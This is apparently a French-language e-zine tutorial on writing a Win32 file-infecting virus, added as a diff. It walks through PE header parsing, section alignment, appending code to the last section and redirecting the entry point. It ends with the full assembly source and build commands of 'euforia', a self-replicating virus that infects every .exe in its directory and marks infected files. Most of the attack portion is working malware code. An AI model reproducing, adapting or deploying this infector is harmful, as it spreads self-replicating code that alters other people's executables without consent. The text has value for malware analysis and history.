+push [ebp+Mhandle]
+call [ebp+ACloseHandle]             ; on ferme le fichier.
+mov ecx,[ebp+Alignraw]              ; on mets dans ecx l'alignement du fichier.
+call align                          ; on aligne la nouvelle taille à mapper.
+xchg eax, esi                       ; esi est donc désormais la nouvelle taille.
+call mapping                        ; et on remappe en ajoutant la taille de notre virus.
+
+
+....
+....
+....
+
+
+align:
+mov eax,[ebp+WFD_nFileSizeLow]      ; eax = taille de notre fichier avant infection.
+add eax, offset fin - offset start  ; on ajoute la taille de notre virus.
+xor edx, edx                        ; edx = 0.
+div ecx                             ; on divise par l'alignement.
+inc eax                             ; on incrémente eax.
+mul ecx                             ; on multiplie eax par ecx.
+ret
+
+demap:
+push [ebp+AddrMap]
+call [ebp+AunMapViewOfFile]
+push [ebp+Mhandle]
+call [ebp+ACloseHandle]
+push [ebp+Fhandle]
+call [ebp+ACloseHandle]
+jmp  second
+
+-------------------------------
+
+
+Normalement, vous avez du vous demander ce que c'est exactement cette alignement, bon je vais
+expliquer tout ça. Je vous conseille donc d'avoir à côté de vous un bonne documentation sur
+le Pe header, celle qui se trouve dans le rtc mag de Doxtor L. fera très bien l'affaire, sinon
+il existe celle de Christal. Mais bon, je vais quand même essayer de reprendre ce qu'il y a de
+plus important pour pouvoir comprendre.
+Nous ce qui nous intéresse dans ce cas précis, c'est le Pe header et l'entête optionnel, beh
+surtout cette dernière car elle contient beaucoup d'informations qui nous sont nécessaires.
+L'entête optionnel contient à l'offset 20h et 24h l'alignement de la section et l'alignement du
+fichier. L'alignement du fichier nous fait savoir que la taille de notre fichier sur le disque
+doit être un multiple de ce nombre, par exemple si on a comme alignement du fichier 200h, alors
+le taille de notre fichier sur le disque sera un multiple de ce nombre, ca pourrait donc être
+200h, 400h, 1200h ou 2600h etc... Et c'est là que on doit faire attention car le fichier mapper
+lorque il sera démapper fera la taille que l'on aura donner en dernier argument de l'api
+MapViewOfFile, il faut donc que ce nombre soit un multiple de ce qui se trouve à l'offset 24h
+de l'entete optionnel. Le call align va donc nous permettre de réaliser cela, voici encore un
+exemple pour vous expliquer comment il fonctionne, on admet que notre fichier avant infection
+à une taille 12000h et que le virus fait 143h :
+
+
+mov ecx,[ebp+Alignraw]                 ; on mets dans ecx l'alignement, pour nous 200h
+mov eax,[ebp+WFD_nFileSizeLow]         ; eax = 12000 donc eax est un multiple de 200h
+
+align:
+
+add eax, offset fin - offset start     ; on ajoute la taille du virus, cad 143 dc eax = 12143h.
+xor edx, edx                           ; edx = 0.
+div ecx                                ; on divise par 200h donc en eax on a 90h.
+inc eax                                ; on incrémente eax donc eax = 91h.
+mul ecx                                ; on multiplie par 200h -> eax = 12200h.
+ret                                    ; on a donc en eax maintenant la taille à mapper où l'on
+                                       ; a ajouter la taille du virus et qui est bien un
+                                       ; multiple de 200h.
+
+Bon, on en a fini avec tout ces trucs, on va pouvoir continuer. Le but de notre code est
+d'aller s'écrire dans un fichier à infecter. Sous windows, un fichier est composé d'une entete
+et de plusieurs sections, nous allons donc aller devoir s'écrire dans l'une d'elles, je pense
+qu'il doit être possible de copier notre code dans une nouvelle section que l'on viendra de
+créer. Pour nous, ce sera plus simple, on va tout bêtement aller s'écrire dans la dernière
+section du programme. Or chaque section a une entête spécifique, notre but pour l'instant est
+de trouver cette section header, voici comment est organisé le Pe header:
+
+
+       +--------------------------+
+       |        Pe header         |    --> Taille  : 18h.
+       |                          |
+       +--------------------------+
+       |         En tête          |    --> Taille  : 60h.
+       |        optionnel         |
+       +--------------------------+
+       |       En tête des        |    --> L'entête d'un répertoire a une taille de 8h.
+       |       répertoires        |
+       +--------------------------+
+       |       En tête des        |    --> L'header d'une section a une taille de 28h.
+       |         sections         |
+       +--------------------------+
+       |          .....           |
+       |          .....           |
+       +--------------------------+
+
+Nous, ce que nous voulons, c'est trouver l'adresse de l'header de la dernière section. Nous
+allons donc devoir ajouter à l'adresse du Pe header, la taille du Pe header, la taille de
+l'entete optionnel, la taille de la table des repertoires et la taille prise par les entetes de
+sections :
+- pour ce qui est de l'adresse du Pe header, nous avons déjà vu comment faire.
+- la taille de l'optionnal header est de 60h et la taille du Pe header est de 18h donc taille
+du Pe header + Optionnal header = 78h.
+- les réperoires nous permettent entre outre de connaitre l'adresse des fonctions importés et
+des fonctions exportés. Un reperoire a une taille de 8h sur le disque. Pour connaître la place
+prise par la table des réperoires, il nous suffit donc de multiplier le nb total de répertoires
+par 8.
+- l'header d'une section a elle une taille de 28h. Et à l'offset 6h du Pe header est justement
+contenu le nombre de section, en décrémentant ce nombre, on peut donc pointer sur l'header de
+la dernière section.
+
+-------------------------------
+
+mov edx, [eax+3ch]            ; edx = adresse relative du Pe header.
+push eax                      ; on sauve l'image base.
+add edx, eax                  ; edx -> Pe header.
+push edx                      ; on push l'adresse du Pe header.
+xor eax, eax                  ; eax = 0.
+movzx eax, [edx+6h]           ; on mets dans eax, le nb de sections.
+dec eax                       ; eax = eax - 1.
+mov ecx, 28h                  ; ecx = taille de l'entete d'une section.
+mul ecx                       ; eax = eax * 28h.
+pop edx                       ; edx -> Pe header.
+mov ebx, [edx+74h]            ; on mets dans ebx le nb total de répertoires.
+shl ebx, 3                    ; nb de réperoires * 8.
+push edx                      ; edx = adresse du Pe header.
+add edx, 78h                  ; edx = edx + Taille du Pe header + Taille des entetes optionnel.
+add edx, ebx                  ; edx = edx + taille prise par la table des réperoires.
+add edx, eax                  ; edx -> dernière section.
+
+-------------------------------
+
+Désormais, nous connaissons donc bien l'adresse de l'header de la dernière section. La première
+chose que nous allons faire est de rendre cette section écrivable et lisable. A l'offset 24h de
+l'header de la dernière section se trouve les charactéristiques de la section, c'est donc ici
+que nous allons modifié pour permettre de rendre la section readable et writable.
+Un or [edx+24h], 0A0000020h va nous permettre de faire cela.
+Pour ne pas avoir à infecter des fichiers déjà infectés, nous allons devoir mettre une marque
+qui nous permettra de savoir si le fichier a déjà été infecté par le virus. Pour cela, nous
+allons devoir écrire notre signature dans un champs qui est inutilisé pour le fonctionnement
+du programme, on a justement cela à l'offset 24h du Pe header.
+
+Généralement, un infecteur lorsqu'il s'injecte dans un programme à pour fonction de modifier
+l'EntryPoint pour que lorsque l'on relancera le fichier après infection, la première ligne de
+code à éxécuter soit celle de notre virus qui s'est copié. Réfléchissons un peu, notre
+infecteur va aller s'écrire à la fin de la dernière section. En ajoutant donc la taille de la
+dernière section avant infection à l' adresse virtuel relative de la dernière section, on
+devrait donc modifier l'EntryPoint pour qu'il pointe justement sur ce que l'on désire.
+L' autre chose à connaître est l'endroit où l'on désire copier notre code, comme on l'a dit,
+notre code sera écrit à la fin de la dernière section. La somme de l'offset de la section dans
+le fichier avec la taille de la dernière section sur le disque devrait donc nous permettre de
+savoir où nous allons copier notre infecteur.
+Voici une petit rappel sur l'header d'une section:
+- à l'offset 0ch se trouve l'adresse relative de la section.
+- à l'offset 10h se trouve la taille de la section sur le disque.
+- à l'offset 14h se trouve l'offset de la section dans le fichier.
+Le code sera commenté plus bas.
+
+L'ajout de notre infecteur dans la dernière section va nodifier certains champs de l'header de
+de cette section:
+- à l'offset 08h se trouve la taille de la section en mémoire qui doit être un multiple de
+l'alignement qui est à l'offset 20h de l'entête optionnel.
+- à l'offset 10h se trouve aussi la taille de la section sur le disque qui doit être un
+multiple de l'alignement qui se trouve à l'offset 24h de l'optionnal header.
+Pour modifier ces 2 champs, nous allons utilsé la call align décrit plus haut.
+
+
+
+-------------------------------
+
+or [edx+24h], 0A0000020h             ; on modifie les attributs de la dernière section.
+pop ebx                              ; ebx -> Pe header.
+mov [ebx+4ch], "EKIR"                ; on écrit notre signature.
+mov eax, [edx+10h]                   ; eax = Taille de la section sur le disque.
+mov ecx, eax                         ; eax = ecx.
+add ecx, [edx+0ch]                   ; Entrypoint = ecx + Adresse virtuel de la section.
+add eax, [edx+14h]                   ; Endroit où copier le virus = eax + offset de la section.
+push eax                             ; eax = endroit de copie du virus.
+push ecx                             ; ecx = Entrypoint.
+
+
+mov ecx, [ebp+Alignraw]              ; ecx = alignement de la section sur le disque.
+mov eax, [edx+10h]                   ; eax = taille de la section sur le disque.
+push edx             ; .rsrc         ; on sauve edx qui va être modifié dans le call.
+call align                           ; on aligne.
+pop edx                              ; on récupère edx.
+mov [edx+10h], eax                   ; on écrit la nouvelle taille du fichier sur le disque, en
+                                     ; ajoutant la taille de notre virus.
+
+mov ecx, [ebp+Alignvirtual]          ; ecx = alignement de la section en mémoire.
+mov eax, [edx+08h]                   ; eax = taille de la section en mémoire.
+push edx             ; .rsrc
+call align                           ; on aligne.
+pop edx
+mov [edx+08h], eax                   ; et on écrit le nouvel eax calculé.
+
+
+-------------------------------
+
+
+
+Un fichier infecté aura son EntryPoint modifier de telle sorte que le code de l'infecteur soit
+exécuté avant toute chose. Mais après ça, pour rester le plus discret possible, l'infecteur
+doit être capable de rendre la main au code d'origine pour que le programme puisse fonctionner
+comme si rien ne s'était passé.
+Au offset 10h et 1ch de l'entête optionnel ( donc 28h et 34h à partir du Pe header) se trouve
+respectivement l' Entrypoint, cad l'adresse relative la 1ere instruction à exécuter et l' image
+base du fichier, cad l'adresse du fichier en mémoire. Donc :
+(Pe header + 28h) + (Pe header + 34h) == Adresse où rendre la main.
+        |                   |
+        V                   V
+    Entrypoint          Image Base
+
+
+A l'offset 38h de l'optionnal header se trouve la taille totale de l'image du fichier. Ce
+champs va donc être modifié suite à l'ajout de notre code.
+
+Taille de l'image == Taille de la dernière section  + Adresse relative de la dernière section
+                    (calculé avec l'ajout du virus)
+        |                          |                                     |
+        V                          V                                     V
+(Pe header + 50h) == (Header last section + 10h)    +        (Header last section + 0ch)
+
+C'est bon, on a fini toutes les modifications de l'header, il ne nous reste plus que la copie
+de notre code en mémoire qui sera copié sur le disque lorsque l'on démappera. Pour cela, on
+va utilisé l'instruction rep movsb qui va transférer ce qui se trouve en esi vers la zone
+mémoire pointé par edi, et cela ecx fois. Après, il ne nous restera plus qu'à démapper.
+
+
+-------------------------------
+
+mov eax, dword ptr [ebx+34h]         ; eax = ImageBase.
+add eax, dword ptr [ebx+28h]         ; eax = ImageBase + Entrypoint.
+mov [ebp+Entrypoint], eax            ; on le sauve.
+
+
+
+pop ecx                              ; ecx = new Entrypoint calculé.
+mov [ebx+28h], ecx                   ; on l'écrit.
+mov eax,[edx+10h]                    ; eax = Taille de la dernière section.
+add eax,[edx+0Ch]                    ; eax = eax + Adresse relative de la dernière section
+mov [ebx+50h],eax                    ; on copie la nouvelle taille totale du fichier.
+pop eax                              ; eax = adresse relative où copier le virus.
+
+pop edi                              ; edi = adresse de base = MZ header.
+add edi, eax                         ; edi = adresse où copier le virus.
+mov ecx, offset fin - offset start   ; on copie la taille de notre infecteur.
+lea esi, [ebp+start]                 ; et à partir du label start donc du début.
+rep movsb                            ; on copie.
+
+push [ebp+AddrMap]
+call [ebp+AunMapViewOfFile]          ; on démap.
+push [ebp+Mhandle]
+call [ebp+ACloseHandle]
+push [ebp+Fhandle]
+call [ebp+ACloseHandle]
+
+-------------------------------
+
+
+La dernière chose à faire est de rendre la main au fichier hôte, comme si rien ne s'était
+passé.
+
+-------------------------------
+
+mov ecx, [ebp+Entrypoint]            ; ecx = 1ere instruction que le fichier exécutait avant
+mov [ebp+NewEp], ecx                 ; qui soit infecté.
+
+....
+....
+....
+
+
+exit:
+cmp ebp, 0                           ; on regarde si on en est à notre 1ere infection.
+je exit1                             ; si oui, on ferme avec l'api ExitProcess.
+mov eax, [ebp+NewEp]                 ; sinon, on effectue un saut et on rend la main
+jmp eax                              ; au programme d'origine.
+
+....
+....
+
+exit1:
+push 0
+call [ebp+AExitProcess]
+
+-------------------------------
+
+
+
+
+
+[3/ Code source : ]
+
+
+
+-----------------------------------------------------------------------------------------------
+; euforia.asm par rikenar.
+; virus win32 qui infecte tous les fichiers exe du répertoire.
+; et qui ajoute l'affichage d'une messagebox.
+; tasm32 -ml -m5 -q euforia.asm
+; tlink32 -Tpe -aa -x -c euforia.obj ,,,import32
+; rikenar.al@secureroot.com
+; http://barbus.homeunix.org/rikenar
+; étant donné que l'on enregistre tous dans la section .code, il faut qu'on rende cette section
+; writable. Pour faire ça, vous avez qu'à modifier les caractéristiques de la section .code en
+; e0000020 avec procdump.
+; testé sous windows 98, il est possible que sur xp, 2000, et nt, le code ne fonctionne pas à
+; cause du fait que ces 3 derniers doivent être moins souple au niveau de l'écriture de notre
+; code ( mais en cherchant un peu, on doit pouvoir arriver à le faire fonctionner parfaitement).
+
+
+.386
+locals
+jumps
+.model flat, stdcall
+
+extrn ExitProcess:NEAR
+extrn MessageBoxA:NEAR
+
+.data
+db "Euforia 1.0 par rikenar",0
+
+.code
+start:
+mov eax, [esp]
+call delta
+
+delta:
+pop ebp
+sub ebp, offset delta
+and eax, 0ffff0000h
+inc eax
+
+loop:
+dec eax
+cmp word ptr [eax],'ZM'
+jnz loop
+mov ecx, eax
+mov ecx, [ecx + 3ch]
+add ecx, eax
+cmp word ptr [ecx], 'EP'
+jnz loop
+mov [ebp+APe],ecx
+mov [ebp+Akernel],eax
+
+mov edx, ecx
+mov edx, [edx + 78h]
+add edx, eax
+mov ebx, [edx + 1ch]
+add ebx, eax
+mov [ebp+Afonction], ebx
+mov ebx, [edx + 20h]
+add ebx, eax
+mov [ebp+Namefunc], ebx
+mov ebx, [edx + 24h]
+add ebx, eax
+mov [ebp+Aordinal], ebx
+mov edx, eax
+mov esi,[ebp+Namefunc]
+xor ecx, ecx
+
+go:
+lodsd
+add eax,edx
+mov edi,eax
+push esi
+lea esi,[ebp+NGetProcAdress]
+
+comp:
+cmpsb
+jne next
+cmp byte ptr [edi], 0
+je good
+jmp comp
+
+next:
+pop esi
+inc ecx
+jmp go
+
+good:
+shl ecx, 1
+add ecx, [ebp+Aordinal]
+xor eax, eax
+mov ax, word ptr [ecx]
+shl eax, 2
+add eax, [ebp+Afonction]
+mov ebx, [eax]
+add ebx, edx
+mov [ebp+AGetProcAdress], ebx
+
+
+lea edi, [ebp+AGetModuleHandle]
+lea esi, [ebp+NGetModuleHandle]
+
+search:
+push esi
+push [ebp+Akernel]
+call [ebp+AGetProcAdress]
+mov [edi], eax
+add edi, 4
+
+
+next_api:
+inc esi
+cmp byte ptr [esi], 0
+jne next_api
+inc esi
+cmp byte ptr [esi], 0cch
+jne search
+
+lea edi, [ebp+Auser]
+lea eax, [ebp+Nuser]
+push eax
+call [ebp+AGetModuleHandle]
+mov [ebp+Auser], eax
+
+lea edi, [ebp+NMessageBox]
+push edi
+push [ebp+Auser]
+call [ebp+AGetProcAdress]
+mov [ebp+AMessageBox], eax
+
+lea esi, [ebp+Titre]
+lea edi, [ebp+Message]
+push 30h
+push esi
+push edi
+push 0
+call [ebp+AMessageBox]
+
+mov ecx, [ebp+Entrypoint]
+mov [ebp+NewEp], ecx
+
+lea esi,[ebp+WFD]
+lea eax,[ebp+exe_mask]
+push esi
+push eax
+
+call [ebp+AFindFirstFile]
+cmp  eax, 0ffffffffh
+je   exit
+mov  [ebp+FirstHandle],eax
+
+re:
+
+push 00h
+push 00h
+push 03h
+push 00h
+push 01h
+push 80000000h or 40000000h
+lea esi,[ebp+WFD_szFileName]
+push esi
+call [ebp+ACreateFileA]
+mov [ebp+Fhandle], eax
+mov esi,[ebp+WFD_nFileSizeLow]
+
+call mapping
+call infection
+
+second:
+
+
+lea  edi,[ebp+WFD]
+push edi
+push [ebp+FirstHandle]
+call [ebp+AFindNextFile]
+test  eax, eax
+jnz  re
+
+exit:
+cmp ebp, 0
+je exit1
+mov eax, [ebp+NewEp]
+jmp eax
+
+
+mapping:
+
+push 00h
+push esi
+push 00h
+push 04h
+push 00h
+push [ebp+Fhandle]
+call [ebp+ACreateFileMappingA]
+mov  [ebp+Mhandle], eax
+
+push esi
+push 00h
+push 00h
+push 02h
+push [ebp+Mhandle]
+call [ebp+AMapViewOfFile]
+mov [ebp+AddrMap], eax
+
+ret
+
+infection:
+mov esi,[eax+3Ch]
+add esi,eax
+
+cmp dword ptr [esi],'EP'
+jnz demap
+cmp dword ptr [esi+4Ch],"EKIR"
+jz  demap
+
+mov ecx, [esi+38h]
+mov [ebp+Alignvirtual], ecx
+mov ecx, [esi+3ch]
+mov [ebp+Alignraw], ecx
+
+push [ebp+AddrMap]
+call [ebp+AunMapViewOfFile]
+push [ebp+Mhandle]
+call [ebp+ACloseHandle]
+
+mov ecx,[ebp+Alignraw]
+mov eax,[ebp+WFD_nFileSizeLow]
+call align
+xchg eax, esi
+call mapping
+
+mov edx, [eax+3ch]
+push eax
+add edx, eax
+push edx
+xor eax, eax
+mov ax, [edx+6h]
+dec eax
+mov ecx, 28h
+mul ecx
+pop edx
+mov ebx, [edx+74h]
+shl ebx, 3
+push edx
+add edx, 78h
+add edx, ebx
+add edx, eax
+or [edx+24h], 0A0000020h
+pop ebx
+mov [ebx+4ch], "EKIR"
+mov eax, [edx+10h]
+mov ecx, eax
+add ecx, [edx+0ch]
+add eax, [edx+14h]
+push eax
+push ecx
+
+
+mov ecx, [ebp+Alignraw]
+mov eax, [edx+10h]
+push edx
+call align
+pop edx
+mov [edx+10h], eax
+
+mov ecx, [ebp+Alignvirtual]
+mov eax, [edx+08h]
+push edx
+call align
+pop edx
+mov [edx+08h], eax
+
+
+mov eax, dword ptr [ebx+34h]
+add eax, dword ptr [ebx+28h]
+mov [ebp+Entrypoint], eax
+
+
+
+pop ecx
+mov [ebx+28h], ecx
+mov eax,[edx+10h]
+add eax,[edx+0Ch]
+mov [ebx+50h],eax
+pop eax
+
+pop edi
+add edi, eax
+mov ecx, offset fin - offset start
+lea esi, [ebp+start]
+rep movsb
+
+push [ebp+AddrMap]
+call [ebp+AunMapViewOfFile]
+push [ebp+Mhandle]
+call [ebp+ACloseHandle]
+push [ebp+Fhandle]
+call [ebp+ACloseHandle]
+
+ret
+
+demap:
+push [ebp+AddrMap]
+call [ebp+AunMapViewOfFile]
+push [ebp+Mhandle]
+call [ebp+ACloseHandle]
+push [ebp+Fhandle]
+call [ebp+ACloseHandle]
+jmp  second
+
+exit1:
+push 0
+call [ebp+AExitProcess]
+
+align:
+
+add eax, offset fin - offset start
+xor edx, edx
+div ecx
+inc eax
+mul ecx
+ret
+
+Akernel  dd 0
+APe  dd 0
+Afonction dd 0
+Namefunc dd 0
+Aordinal dd 0
+FirstHandle dd 0
+Fhandle dd 0
+Mhandle dd 0
+AddrMap dd 0
+Alignraw dd 0
+Alignvirtual dd 0
+Entrypoint dd 0
+Rawsize dd 0
+NewEp dd 0
+Base dd 0
+
+NGetProcAdress db "GetProcAddress",0
+NGetModuleHandle db "GetModuleHandleA",0
+NExitProcess db "ExitProcess",0
+NFindFirstFile db 'FindFirstFileA',0
+NFindNextFile db 'FindNextFileA',0
+NCreateFileA db      "CreateFileA",0
+NCreateFileMappingA db "CreateFileMappingA",0
+NMapViewOfFile db "MapViewOfFile",0
+NunMapViewOfFile db "UnmapViewOfFile",0
+NCloseHandle db "CloseHandle",0
+NSetFilePointer db "SetFilePointer",0
+NSetEndOfFile db "SetEndOfFile",0
+
+
+db 0cch
+
+
+AGetProcAdress dd 0
+AGetModuleHandle dd 0
+AExitProcess dd 0
+AFindFirstFile dd 0
+AFindNextFile dd 0
+ACreateFileA dd 0
+ACreateFileMappingA dd 0
+AMapViewOfFile dd 0
+AunMapViewOfFile dd 0
+ACloseHandle dd 0
+ASetFilePointer dd 0
+ASetEndOfFile dd 0
+
+
+Nuser db "User32.dll"
+Auser dd 0
+NMessageBox db "MessageBoxA",0
+AMessageBox dd 0
+Message db "Ce fichier est infecté :)",0
+Titre db "Warning !!!",0
+
+exe_mask  db  "*.exe",0
+
+WFD label   byte
+WFD_dwFileAttributes    dd      ?
+WFD_ftCreationTime      dd      ?
+                        dd      ?
+WFD_ftLastAccessTime    dd      ?
+                        dd      ?
+WFD_ftLastWriteTime     dd      ?
+                        dd      ?
+WFD_nFileSizeHigh       dd      ?
+WFD_nFileSizeLow        dd      ?
+WFD_dwReserved0         dd      ?
+WFD_dwReserved1         dd      ?
+WFD_szFileName          db      260 dup (?)
+WFD_szAlternateFileName db      13 dup (?)
+                        db      03 dup (?)
+
+fin:
+end start
+
+
+
+-----------------------------------------------------------------------------------------------
+
+
+
+[ 4/ Conclusion : ]
+
+Donc voilà la source de cette 1ere version de euforia, ce code n'est en aucun cas une référence
+et n'est en rien optimisé. Donc vous le savez, si vous voulez tester ce programme, alors
+faites le sur votre machine et puis c'est tout (blablabla!). Si jamais vous voulez, vous
+pouvez venir voir sur ma page , il y a aussi un article sur la programmation d'infecteur 16
+bits. Je voudrai remercié kaze pour son aide, tout ceux qui m'ont permis de réaliser cela grâce
+à leurs articles, cad merci à Tipiax, à Billy Belcebu, à Christal, à Doctor L. et à tout les
+membres de rtc, merci aussi à toute la team ioc et puis aussi plus généralement à tous ceux qui
+refusent de se soumettre aux dirigeants qui nous gouvernent, aux patrons qui nous exploitent,
+aux médias qui nous disent n'importe quoi et à l'état qui restreint ma liberté et la votre...
+Comme d'habitude, veuillez m'excuser pour les fautes, pour les erreurs si il y en a, et si vous
+voulez me contacter pour n'importe quoi, alors :
+rikenar.al@secureroot.com
+
+
+
+
+
+http://barbus.homeunix.org/rikenar
+
+
+
+
+                   " C'EST PAS EN PISSANT SUR LES MURS QUE BABYLONE VA TREMBLER "
